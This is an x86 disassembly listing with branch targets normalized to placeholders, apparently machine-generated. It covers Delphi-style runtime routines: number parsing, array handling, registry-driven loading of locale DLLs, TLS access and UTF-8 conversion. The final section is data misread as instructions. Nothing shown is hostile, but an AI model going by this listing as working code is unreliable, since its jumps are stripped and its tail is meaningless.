sub edi 0x30
cmp [ esp + 0xc ] 0x0
jne r-xdata
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
movzx edi cl
sub edi 0x57
jmp r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
cmp [ esp + 0xc ] 0xfffffff
jne r-xdata
jmp r-xdata
je r-xdata
cmp [ esp + 0x8 ] 0x0
cmp [ esp + 0xc ] 0xccccccc
jne r-xdata
jmp r-xdata
cmp [ esi + ebp - 0x1 ] 0x0
setne al
or bl al
je r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jmp r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xffffffff
jbe r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xcccccccc
jbe r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
mov eax edi
cdq
push edx
push eax
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
shld edx eax 0x4
shl eax 0x4
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
setl al
cmp [ esp + 0x8 ] 0x0
setb al
jmp r-xdata
push 0x0
push 0xa
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
call sub_405f54
push edx
push eax
mov eax edi
cdq
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
movzx ecx [ esi + ebp - 0x1 ]
mov eax ecx
add al 0xd0
sub al 0xa
jb r-xdata
dec ebp
cmp al [ esp + 0x10 ]
je r-xdata
sub_406278
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
movzx eax [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_406270
jmp r-xdata
mov al 0x4
call sub_402e78
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_402e78
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_402d5c
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_402d28
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_403728
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_405af0
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_402f9c
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_403728
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_406258
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_406278
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_406410
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_402d44
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_405af0
sub_40644c
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_406410
pop edx
pop eax
sub_406480
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_401360
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_4064b0
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_4012e8
mov eax esp
mov dl 0x1
call sub_406714
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_4064f8
push ebx
push esi
push edi
mov esi eax
mov ebx [ rw-data ]
test ebx ebx
je r-xdata
mov edi esi
cmp esi [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_4064b0
mov edi eax
jmp r-xdata
cmp esi [ ebx + 0x8 ]
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp esi [ ebx + 0xc ]
jne r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
sub_406530
push ebx
push esi
mov esi eax
jmp r-xdata
movzx ebx [ esi ]
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
cmp bl 0x5c
jne r-xdata
push esi
call sub_401280
mov esi eax
sub_406550
push ebp
mov ebp esp
add esp 0xfffffdac
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_4012f0
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call sub_4012f8
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x253 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_406530
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x253 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_406530
mov edi eax
mov eax edi
sub eax esi
add eax ebx
inc eax
cmp eax 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x253 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_406530
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax edi
sub eax esi
inc eax
push eax
push esi
lea eax [ ebp - 0x253 ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14e ]
push eax
lea eax [ ebp - 0x253 ]
push eax
call sub_4012b8
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
push eax
call sub_4012b0
lea eax [ ebp - 0x122 ]
push eax
call sub_401328
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x253 ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x253 ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x122 ]
push eax
lea eax [ ebp - 0x253 ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x122 ]
push eax
call sub_401328
inc eax
add ebx eax
mov esi edi
sub_406714
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_4012e8
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_401340
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_406819
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_406550
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_401348
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_401340
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_401338
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_401348
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_401340
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_401308
push eax
call sub_4012e0
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call sub_401328
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_4069b4
push ebx
push esi
push edi
push ebp
mov ebp eax
mov edi [ rw-data ]
test edi edi
je r-xdata
mov ebx edi
test ebx ebx
je r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebp
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi [ ebx ]
test esi esi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax edi
call sub_402d44
jmp r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
mov eax [ esi + 0x4 ]
cmp eax ebp
jne r-xdata
mov edi esi
mov eax [ esi ]
mov [ ebx ] eax
mov edx 0x8
mov eax edi
call sub_402d44
jmp r-xdata
sub_406a18
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_406a53
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_406a84
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_406ae8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_406a18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406aef
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_406b0c
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_406b38
test edx edx
je sub_406af4
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_402e78
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_406bdc
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call sub_401388
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_406c04
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_406ce0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
movzx edx [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
movzx ecx [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
movzx edx [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
movzx edx [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
movzx edx [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
movzx edx [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
movzx edx dl
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
movzx edx dl
shl ecx 0x6
or edx ecx
mov ecx edx
sub_406e10
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov esi eax
xor eax eax
push ebp
push sub_406ebc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_404e44
mov eax esi
xor edx edx
call sub_4058a0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406ec3
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov eax esi
call sub_4057dc
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_4055ac
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
mov eax esi
call sub_4057dc
push eax
mov eax esi
call sub_4057cc
push eax
mov eax [ ebp - 0x4 ]
call sub_405324
lea edx [ ebx + 0x1 ]
pop ecx
call sub_406c04
test eax eax
jle r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x4 ]
call sub_404e44
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_4055ac
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_404e98
sub_406ecc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov esi eax
xor eax eax
push ebp
push sub_406f77
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_40566c
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406f7e
lea eax [ ebp - 0x4 ]
call sub_40566c
retn
mov [ ebp - 0xc ] esi
mov ebx [ ebp - 0xc ]
mov eax ebx
test eax eax
je r-xdata
lea edx [ ebp - 0x4 ]
xchg edx eax
call sub_405970
test ebx ebx
je r-xdata
sub eax 0x4
mov eax [ eax ]
push ebx
mov eax [ ebp - 0x4 ]
call sub_4057dc
inc eax
push eax
mov eax esi
call sub_405324
push eax
mov eax [ ebp - 0x4 ]
call sub_4057cc
pop ecx
pop edx
call sub_406ce0
test eax eax
jle r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x4 ]
call sub_40566c
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_405970
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4056a8
sub_406f84
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_406fc7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4057bc
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_406e10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406fce
lea eax [ ebp - 0x4 ]
call sub_40566c
retn
sub_406fd4
push ebx
push esi
add esp 0xfffff004
push eax
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x1000
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_40503c
push 0x1000
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_4064f8
push eax
call sub_401318
mov ecx eax
mov edx esp
mov eax esi
call sub_404f34
jmp r-xdata
sub_407034
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_407088
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40708f
retn
mov eax rw-data
call sub_4035c0
mov eax rw-data
call sub_4035c0
mov eax rw-data
call sub_4035c0
call sub_402cbc
mov eax rw-data
call sub_404e44
sub_4070c8
push ebx
call sub_4070c0
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_4070b4
test eax eax
jne r-xdata
mov eax 0xe2
call sub_404d84
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_404d84
sub_40710c
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_4070c8
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_407158
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_407094
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_40714c
mov edx rw-data
mov eax ebx
call sub_404af0
pop ebx
retn
sub_4071d8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_4071f4
clc
jno r-xdata
arpl [ ebp + 0x73 ] si
or [ fs : edi + 0x64 ] ebp
inc esp
popa
jne r-xdata
add [ ebx ] al
add ch [ esi ]
xor [ 0x0 ] eax
or al 0x0
add [ eax ] al
hlt
jb r-xdata
je r-xdata
dec ebx
add [ ebx - 0x13da0040 ] cl
push ds
dec ebx
add [ ebx - 0x17da0040 ] cl
push ds
dec ebx
add [ ebx - 0x1bda0040 ] cl
push ds
dec ebx
add [ ebx - 0x1fda0040 ] cl
push ds
dec ebx
add [ ebx - 0x23da0040 ] cl
push ds
dec ebx
add [ ebx - 0x27da0040 ] cl
push ds
dec ebx
add [ ebx - 0x2bda0040 ] cl
push ds
dec ebx
add [ ebx - 0x2fda0040 ] cl
push ds
dec ebx
add [ ebx - 0x33da0040 ] cl
push ds
dec ebx
add [ ebx - 0x37da0040 ] cl
push ds
dec ebx
add [ ebx - 0x3bda0040 ] cl
push ds
dec ebx
add [ ebx - 0x3fda0040 ] cl
push ds
dec ebx
add [ ebx - 0x43da0040 ] cl
push ds
dec ebx
add [ ebx - 0x47da0040 ] cl
push ds
dec ebx
add [ ebx - 0x4bda0040 ] cl
push ds
dec ebx
add [ ebx - 0x4fda0040 ] cl
push ds
dec ebx
add [ ebx - 0x53da0040 ] cl
push ds
dec ebx
add [ ebx - 0x57da0040 ] cl
push ds
dec ebx
add [ ebx - 0x5bda0040 ] cl
push ds
dec ebx
add [ ebx - 0x5fda0040 ] cl
push ds
dec ebx
add [ ebx - 0x63da0040 ] cl
push ds
dec ebx
add [ ebx - 0x67da0040 ] cl
push ds
dec ebx
add [ ebx - 0x6bda0040 ] cl
push ds
dec ebx
add [ ebx - 0x6fda0040 ] cl
push ds
dec ebx
add [ ebx - 0x73da0040 ] cl
push ds
dec ebx
add [ ebx - 0x77da0040 ] cl
push ds
dec ebx
add [ ebx - 0x7bda0040 ] cl
push ds
dec ebx
add [ ebx - 0x7fda0040 ] cl
push ds
dec ebx
add [ ebx + 0x7c25ffc0 ] cl
push ds
dec ebx
add [ ebx + 0x7825ffc0 ] cl
push ds
dec ebx
add [ ebx + 0x7425ffc0 ] cl
push ds
dec ebx
add [ ebx + 0x7025ffc0 ] cl
push ds
dec ebx
add [ ebx + 0x6c25ffc0 ] cl
push ds
dec ebx
add [ ebx + 0x6825ffc0 ] cl
push ds
dec ebx
add [ ebx + 0x6425ffc0 ] cl
push ds
dec ebx
add [ ebx + 0x6025ffc0 ] cl
push ds
dec ebx
add [ ebx + 0x5c25ffc0 ] cl
push ds
dec ebx
add [ ebx + 0x5825ffc0 ] cl
push ds
dec ebx
add [ ebx + 0x5425ffc0 ] cl
push ds
dec ebx
add [ ebx + 0x5025ffc0 ] cl
push ds
dec ebx
add [ ebx + 0x4c25ffc0 ] cl
push ds
dec ebx
add [ ebx + 0x4825ffc0 ] cl
push ds
